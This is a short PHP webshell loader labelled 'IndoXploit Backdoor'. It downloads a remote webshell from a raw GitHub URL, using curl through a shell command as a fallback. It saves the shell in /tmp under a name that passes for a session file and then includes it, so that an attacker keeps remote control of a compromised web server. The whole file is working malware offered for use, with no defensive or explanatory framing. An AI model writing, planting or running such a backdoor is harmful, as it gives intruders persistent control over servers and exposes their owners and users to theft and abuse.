<?php
# IndoXploit Backdoor
# Bypass 406 Not Acceptable & Auto Delete Shell
# Coded by: L0c4lh34rtz - IndoXploit
 
$URL = 'https://raw.githubusercontent.com/justikail/webshell/main/alfav4.1-tesla.php';  # Backdoor URL
$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # dont change this !!
 
function M() {
    $FGT = @file_get_contents($GLOBALS['URL']);
    if(!$FGT) {
        echo `curl -k $(echo {$GLOBALS['URL']}) > {$GLOBALS['TMP']}`;
    } else {
        $HANDLE = fopen($GLOBALS['TMP'], 'w');
        fwrite($HANDLE, $FGT);
        fclose($HANDLE);
    }
    echo '<script>window.location="?LOL";</script>';
}
 
if(file_exists($TMP)) {
    if(filesize($TMP) === 0) {
        unlink($TMP);
        M();
    } else {
        include($TMP);
    }
} else {
    M();
}
?>
